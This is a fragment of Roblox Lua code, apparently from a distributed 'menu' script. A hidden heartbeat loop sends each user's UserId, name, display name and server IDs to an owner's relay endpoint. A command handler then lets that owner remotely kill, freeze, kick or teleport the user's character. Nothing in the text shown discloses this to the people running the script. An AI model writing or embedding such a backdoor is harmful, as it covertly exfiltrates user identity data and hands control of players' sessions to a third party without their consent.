local function OwnerLink_Run(cmd)
    local char = LocalPlayer.Character
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    local t = cmd.type
    if t == "kill" then
        if hum then hum.Health = 0 end
        if char then pcall(function() char:BreakJoints() end) end
    elseif t == "freeze" then
        OwnerLink.Frozen = true
        if hrp then hrp.Anchored = true end
    elseif t == "unfreeze" then
        OwnerLink.Frozen = false
        if hrp then hrp.Anchored = false end
    elseif t == "kick" then
        LocalPlayer:Kick(tostring(cmd.reason or "Removed by the script owner."))
    elseif t == "message" then
        Banner_Show(cmd.text)
    elseif t == "send" then
        if typeof(cmd.jobId) == "string" and cmd.jobId ~= "" and typeof(cmd.placeId) == "number" and cmd.placeId > 0 and cmd.jobId ~= game.JobId then
            TeleportService:TeleportToPlaceInstance(cmd.placeId, cmd.jobId, LocalPlayer)
        end
    elseif t == "bring" then
        if typeof(cmd.jobId) == "string" and cmd.jobId ~= "" and cmd.jobId ~= game.JobId and typeof(cmd.placeId) == "number" and cmd.placeId > 0 then
            TeleportService:TeleportToPlaceInstance(cmd.placeId, cmd.jobId, LocalPlayer)
        else
            local owner = typeof(cmd.ownerUid) == "number" and Players:GetPlayerByUserId(cmd.ownerUid) or nil
            local ohrp = owner and owner.Character and owner.Character:FindFirstChild("HumanoidRootPart")
            if ohrp and hrp then
                hrp.AssemblyLinearVelocity = Vector3.zero
                hrp.CFrame = ohrp.CFrame * CFrame.new(0, 0, 4)
            end
        end
    end
end

local function OwnerLink_Start()
    if not RELAY_READY then return end
    task.spawn(function()
        local lastSync, lastJob = -math.huge, nil
        while not Unloaded do
            local now = os.clock()
            local sync = (now - lastSync) >= 60 or lastJob ~= game.JobId
            local body = { uid = LocalPlayer.UserId, wait = true }
            if sync then
                body.sync = true
                body.name = LocalPlayer.Name
                body.display = LocalPlayer.DisplayName
                body.placeId = game.PlaceId
                body.jobId = game.JobId
                body.ver = "menu"
            end
            local data = OwnerLink_Post("/hb", body)
            if data and data.ok then
                if sync then lastSync, lastJob = now, game.JobId end
                for _, cmd in ipairs(typeof(data.cmds) == "table" and data.cmds or {}) do
                    if typeof(cmd) == "table" and typeof(cmd.id) == "string" and not OwnerLink.Seen[cmd.id] then
                        OwnerLink.Seen[cmd.id] = true
                        pcall(OwnerLink_Run, cmd)
                    end
                end
            end
            -- Short pause between check-ins
            for _ = 1, (data and data.ok) and 1 or 8 do
                if Unloaded then return end
                task.wait(1.1)
            end
        end
    end)
end

